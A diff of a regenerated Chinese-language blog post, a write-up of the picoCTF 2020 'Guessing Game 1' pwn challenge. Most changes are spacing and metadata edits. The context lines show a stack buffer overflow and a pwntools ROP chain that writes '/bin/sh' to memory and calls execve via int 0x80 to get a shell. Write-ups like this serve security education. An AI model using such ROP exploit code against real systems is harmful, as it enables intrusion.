@@ -3,11 +3,11 @@
 <head>
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title>picoCTF2020-Guessing-Game-1 - 山羊的部落格</title>
+  <title>picoCTF2020 Guessing Game 1 - 山羊的部落格</title>
   
 
 <meta name="renderer" content="webkit" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes"/>
 
 <meta name="MobileOptimized" content="width"/>
 <meta name="HandheldFriendly" content="true"/>
@@ -23,7 +23,7 @@
 <meta name="mobile-web-app-capable" content="yes">
 
 <meta name="author" content="93wilsonlu" />
-  <meta name="description" content="這題目花了我好幾個小時 https://play.picoctf.org/events/3/challenges/challenge/90 開始 我們先看看Makefile 1 2 3 4 all: gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c clean: rm vuln 這個程式可能有 Buffer Overflow，它用 static link，不" />
+  <meta name="description" content="這題目花了我好幾個小時 https://play.picoctf.org/events/3/challenges/challenge/90 開始 我們先看看 Makefile 1 2 3 4 all: gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c clean: rm vuln 這個程式可能有 Buffer Overflow，它用 static link，不能改 plt, got 看看 do_stuff" />
 
   <meta name="keywords" content="Hugo" />
 
@@ -32,7 +32,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.65.3" />
+<meta name="generator" content="Hugo 0.83.1" />
 
 
 <link rel="canonical" href="https://93wilsonlu.github.io/post/picoctf2020-guessing-game-1/" />
@@ -53,29 +53,26 @@
 
 
 
-<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+<link rel="stylesheet" href="/sass/jane.min.b3a8813c06e6d785beba22bf8264e174fa2cb3a396b22f9ba24e2c00c18aaf7f.css" integrity="sha256-s6iBPAbm14W&#43;uiK/gmThdPoss6OWsi&#43;bok4sAMGKr38=" media="screen" crossorigin="anonymous">
 
 
 
 
 
-<meta property="og:title" content="picoCTF2020-Guessing-Game-1" />
-<meta property="og:description" content="這題目花了我好幾個小時 https://play.picoctf.org/events/3/challenges/challenge/90 開始 我們先看看Makefile 1 2 3 4 all: gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c clean: rm vuln 這個程式可能有 Buffer Overflow，它用 static link，不" />
+<meta property="og:title" content="picoCTF2020 Guessing Game 1" />
+<meta property="og:description" content="這題目花了我好幾個小時 https://play.picoctf.org/events/3/challenges/challenge/90 開始 我們先看看 Makefile 1 2 3 4 all: gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c clean: rm vuln 這個程式可能有 Buffer Overflow，它用 static link，不能改 plt, got 看看 do_stuff" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://93wilsonlu.github.io/post/picoctf2020-guessing-game-1/" />
-<meta property="article:published_time" content="2020-10-14T00:00:00+00:00" />
-<meta property="article:modified_time" content="2020-10-14T00:00:00+00:00" />
-<meta itemprop="name" content="picoCTF2020-Guessing-Game-1">
-<meta itemprop="description" content="這題目花了我好幾個小時 https://play.picoctf.org/events/3/challenges/challenge/90 開始 我們先看看Makefile 1 2 3 4 all: gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c clean: rm vuln 這個程式可能有 Buffer Overflow，它用 static link，不">
-<meta itemprop="datePublished" content="2020-10-14T00:00:00&#43;00:00" />
+<meta property="og:url" content="https://93wilsonlu.github.io/post/picoctf2020-guessing-game-1/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2020-10-14T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2020-10-14T00:00:00&#43;00:00" />
+
+<meta itemprop="name" content="picoCTF2020 Guessing Game 1">
+<meta itemprop="description" content="這題目花了我好幾個小時 https://play.picoctf.org/events/3/challenges/challenge/90 開始 我們先看看 Makefile 1 2 3 4 all: gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c clean: rm vuln 這個程式可能有 Buffer Overflow，它用 static link，不能改 plt, got 看看 do_stuff"><meta itemprop="datePublished" content="2020-10-14T00:00:00&#43;00:00" />
 <meta itemprop="dateModified" content="2020-10-14T00:00:00&#43;00:00" />
-<meta itemprop="wordCount" content="743">
-
-
-
+<meta itemprop="wordCount" content="716">
 <meta itemprop="keywords" content="picoCTF,CTF,pwn," /><meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="picoCTF2020-Guessing-Game-1"/>
-<meta name="twitter:description" content="這題目花了我好幾個小時 https://play.picoctf.org/events/3/challenges/challenge/90 開始 我們先看看Makefile 1 2 3 4 all: gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c clean: rm vuln 這個程式可能有 Buffer Overflow，它用 static link，不"/>
+<meta name="twitter:title" content="picoCTF2020 Guessing Game 1"/>
+<meta name="twitter:description" content="這題目花了我好幾個小時 https://play.picoctf.org/events/3/challenges/challenge/90 開始 我們先看看 Makefile 1 2 3 4 all: gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c clean: rm vuln 這個程式可能有 Buffer Overflow，它用 static link，不能改 plt, got 看看 do_stuff"/>
 
 <!--[if lte IE 9]>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
@@ -324,7 +321,7 @@ if (!doNotTrack) {
           <article class="post bg-white">
     
     <header class="post-header">
-      <h1 class="post-title">picoCTF2020-Guessing-Game-1</h1>
+      <h1 class="post-title">picoCTF2020 Guessing Game 1</h1>
       
       <div class="post-meta">
         <time datetime="2020-10-14" class="post-time">
@@ -352,7 +349,7 @@ if (!doNotTrack) {
       <p>這題目花了我好幾個小時</p>
 <p><a href="https://play.picoctf.org/events/3/challenges/challenge/90">https://play.picoctf.org/events/3/challenges/challenge/90</a></p>
 <h2 id="開始">開始</h2>
-<p>我們先看看Makefile</p>
+<p>我們先看看 Makefile</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -438,7 +435,7 @@ if (!doNotTrack) {
 <p>可以進到 <code>win</code> 裡面了
 <img src="/img/picoCTF2020-Guessing-Game-1/access_first_level.png" alt=""></p>
 <h2 id="決定攻擊手法">決定攻擊手法</h2>
-<p><code>win</code> 裡面有Buffer Overflow，明明 <code>BUFSIZE</code> 只有100，卻可以填360個字元</p>
+<p><code>win</code> 裡面有 Buffer Overflow，明明 <code>BUFSIZE</code> 只有 100，卻可以填 360 個字元</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -512,18 +509,18 @@ printf 看起來不能利用</li>
 </code></pre></td></tr></table>
 </div>
 </div><blockquote>
-<p>rcx 找不到適合的 gadget，只好先不理它，反正它常常是0</p>
+<p>rcx 找不到適合的 gadget，只好先不理它，反正它常常是 0</p>
 </blockquote>
 <blockquote>
-<p>想知道更多system call用法，可以到這個網站
+<p>想知道更多 system call 用法，可以到這個網站
 <a href="https://syscalls.w3challs.com/?arch=x86">https://syscalls.w3challs.com/?arch=x86</a></p>
 </blockquote>
 <h2 id="暫存器尺寸">暫存器尺寸</h2>
 <p>原本以為沒事了，沒想到&hellip;
 <img src="/img/picoCTF2020-Guessing-Game-1/reg_size_problem.png" alt="">
 輸入的資料會黏在一起</p>
-<p>我們輸入的是 32-bit，但卻用64-bit的暫存器，所以必須在資料後面加上4個<code>\x00</code></p>
-<p>如果你用flat，可以在每個指令後面都加入一個0</p>
+<p>我們輸入的是 32-bit，但卻用 64-bit 的暫存器，所以必須在資料後面加上 4 個<code>\x00</code></p>
+<p>如果你用 flat，可以在每個指令後面都加入一個 0</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -587,7 +584,7 @@ printf 看起來不能利用</li>
 <span class="n">int_0x80</span> <span class="o">=</span> <span class="mh">0x468fea</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">120</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span><span class="n">pop_rax</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rdx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;/bin&#39;</span><span class="p">,</span><span class="mi">0</span> <span class="p">,</span> <span class="n">mov_drax_edx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span><span class="n">pop_rax</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rdx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;/bin&#39;</span><span class="p">,</span><span class="mi">0</span> <span class="p">,</span> <span class="n">mov_drax_edx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
                  <span class="n">pop_rax</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rdx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span><span class="mi">0</span> <span class="p">,</span> <span class="n">mov_drax_edx</span><span class="p">,</span> <span class="mi">0</span><span class="p">])</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span><span class="n">pop_rbx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> \
                  <span class="n">pop_rax</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rdx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">int_0x80</span><span class="p">,</span> <span class="mi">0</span><span class="p">])</span>
@@ -641,6 +638,19 @@ printf 看起來不能利用</li>
       
       <nav class="post-nav">
         
+          <a class="prev" href="/post/2021-ais3-pre-exam-%E8%B3%BD%E5%BE%8C%E5%BF%83%E5%BE%97/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">2021 AIS3 Pre-Exam 賽後心得</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
         
           <a class="next" href="/post/e325-%E5%9F%BA%E6%9C%AC%E9%A1%8C-%E5%B0%8F%E5%B4%B4%E7%9A%84io%E5%84%AA%E5%8C%96%E6%8C%91%E6%88%B0/">
             <span class="next-text nav-default">e325 基本題-小崴的IO優化挑戰</span>
